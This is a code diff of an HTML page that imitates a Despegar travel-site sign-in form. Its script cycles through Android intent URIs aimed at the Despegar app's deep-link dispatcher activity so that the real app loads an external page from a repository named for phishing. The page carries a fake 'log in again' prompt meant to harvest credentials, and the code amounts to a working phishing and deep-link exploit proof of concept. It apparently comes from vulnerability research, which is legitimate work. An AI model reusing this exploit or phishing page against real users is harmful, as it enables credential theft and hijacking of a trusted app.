@@ -5,47 +5,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Despegar - Sign In</title>
   <style>
-    body { 
-      font-family: Arial, sans-serif; 
-      text-align: center; 
-      padding: 40px 20px; 
-      background: #f8f9fa; 
-      margin: 0;
-    }
-    .logo { 
-      font-size: 32px; 
-      color: #e30613; 
-      font-weight: bold; 
-      margin-bottom: 20px; 
-    }
+    body { font-family: Arial, sans-serif; text-align: center; padding: 40px 20px; background: #f8f9fa; margin: 0; }
+    .logo { font-size: 32px; color: #e30613; font-weight: bold; margin-bottom: 20px; }
     h3 { margin: 10px 0 25px; color: #333; }
-    input, button { 
-      display: block; 
-      margin: 12px auto; 
-      padding: 14px; 
-      width: 280px; 
-      border: 1px solid #ddd; 
-      border-radius: 8px; 
-      font-size: 16px; 
-    }
-    button { 
-      background: #e30613; 
-      color: white; 
-      border: none; 
-      cursor: pointer;
-    }
+    input, button { display: block; margin: 12px auto; padding: 14px; width: 280px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
+    button { background: #e30613; color: white; border: none; cursor: pointer; }
     p { font-size: 13px; color: #666; margin: 20px 0; }
-    .trigger { 
-      display: inline-block; 
-      margin-top: 25px; 
-      padding: 14px 35px; 
-      background: #e30613; 
-      color: white; 
-      border-radius: 8px; 
-      font-size: 16px; 
-      text-decoration: none;
-      font-weight: bold;
-    }
+    .trigger { display: inline-block; margin-top: 25px; padding: 14px 35px; background: #e30613; color: white; border-radius: 8px; font-size: 16px; text-decoration: none; font-weight: bold; }
   </style>
 </head>
 <body>
@@ -54,34 +20,29 @@
   <input type="email" placeholder="Email address" />
   <input type="password" placeholder="Password" />
   <button>Sign In</button>
-  
   <p><strong>Please log in again to continue your booking.</strong></p>
-  
-  <a class="trigger" href="javascript:void(0)" onclick="openInDespegar()">
-    🔄 Open in Despegar App
-  </a>
+
+  <a class="trigger" href="javascript:void(0)" onclick="openInDespegar()">🔄 Open in Despegar App</a>
 
   <script>
     function openInDespegar() {
         const url = "https://honestcorrupt.github.io/poc_repo_for_phishing/";
 
-        // Multiple attempts with different methods
-        const intents = [
-            // 1. Main - using S.url
-            `intent:#Intent;action=android.intent.action.VIEW;component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;S.url=${encodeURIComponent(url)};end`,
+        const attempts = [
+            // Data method (highest chance)
+            `intent://despegar#Intent;action=android.intent.action.VIEW;component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;end`,
             
-            // 2. Using deeplink key
+            // Extra keys
             `intent:#Intent;action=android.intent.action.VIEW;component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;S.deeplink=${encodeURIComponent(url)};end`,
-            
-            // 3. Using data URI (no extra)
-            `intent://despegar#Intent;action=android.intent.action.VIEW;component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;end`
+            `intent:#Intent;action=android.intent.action.VIEW;component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;S.link=${encodeURIComponent(url)};end`,
+            `intent:#Intent;action=android.intent.action.VIEW;component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;S.url=${encodeURIComponent(url)};end`
         ];
 
-        let index = 0;
+        let i = 0;
         function tryNext() {
-            if (index < intents.length) {
-                window.location.href = intents[index];
-                index++;
+            if (i < attempts.length) {
+                window.location.href = attempts[i];
+                i++;
                 setTimeout(tryNext, 700);
             }
         }
